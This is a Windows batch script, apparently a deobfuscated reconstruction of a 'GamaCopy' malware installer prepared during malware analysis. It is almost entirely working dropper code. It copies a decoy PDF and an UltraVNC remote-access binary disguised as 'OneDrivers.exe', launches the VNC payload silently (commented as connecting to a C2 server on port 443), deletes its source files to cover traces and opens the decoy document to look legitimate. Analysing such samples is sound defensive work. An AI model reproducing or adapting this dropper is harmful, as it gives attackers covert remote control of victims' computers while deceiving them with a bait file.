@echo off
REM ============================================================================
REM GamaCopy SFX Installation Script - Deobfuscated Version
REM 
REM Original: 2128869258671564.cmd
REM Purpose: Deploy UltraVNC with obfuscated variable names to evade detection
REM ============================================================================

setlocal enabledelayedexpansion

REM Original obfuscated variable mapping:
REM %ObfuscatedSource1% = Ki58j08O58F68M58q2.PQ87G87O97o67r27Y9 -> svod.pdf
REM %ObfuscatedTarget1% = svod.pdf
REM %ObfuscatedSource2% = yC61y51v51g71p61U4.Eb21h11U11Z31P71F8 -> OneDrivers.exe
REM %ObfuscatedTarget2% = OneDrivers.exe  
REM %ObfuscatedSource3% = lC32A32W52T12R02u1.uZ94Y64M14m54z84J3 -> UltraVNC.ini
REM %ObfuscatedTarget3% = UltraVNC.ini

REM Generate random variable prefix for obfuscation
set "_prefix=%random%%random%%random%"
set "_prefix=%_prefix:~0,8%"

REM Map obfuscated source files to targets
set "%_prefix%src1=Ki58j08O58F68M58q2.PQ87G87O97o67r27Y9"
set "%_prefix%dst1=svod.pdf"
set "%_prefix%src2=yC61y51v51g71p61U4.Eb21h11U11Z31P71F8"
set "%_prefix%dst2=OneDrivers.exe"
set "%_prefix%src3=lC32A32W52T12R02u1.uZ94Y64M14m54z84J3"
set "%_prefix%dst3=UltraVNC.ini"

REM Extract files from SFX archive
REM Step 1: Copy decoy PDF (bait document)
if exist "!%_prefix%src1!" (
    copy /y "!%_prefix%src1!" "!%_prefix%dst1!" >nul 2>&1
)

REM Step 2: Copy UltraVNC executable (renamed as OneDrivers.exe)
if exist "!%_prefix%src2!" (
    copy /y "!%_prefix%src2!" "!%_prefix%dst2!" >nul 2>&1
)

REM Step 3: Copy UltraVNC configuration file
if exist "!%_prefix%src3!" (
    copy /y "!%_prefix%src3!" "!%_prefix%dst3!" >nul 2>&1
)

REM Kill any existing OneDrivers.exe process (persistent malware)
taskkill /f /im "OneDrivers.exe" >nul 2>&1

REM Wait briefly
timeout /t 2 /nobreak >nul 2>&1

REM Start the UltraVNC payload (connects to C2 on port 443)
start "" /b "OneDrivers.exe"

REM Clean up temporary files
del /f /q "!%_prefix%src1!" >nul 2>&1
del /f /q "!%_prefix%src2!" >nul 2>&1
del /f /q "!%_prefix%src3!" >nul 2>&1

REM Open the decoy PDF to appear legitimate
if exist "svod.pdf" (
    start "" "svod.pdf"
)

REM Exit silently
exit /b 0
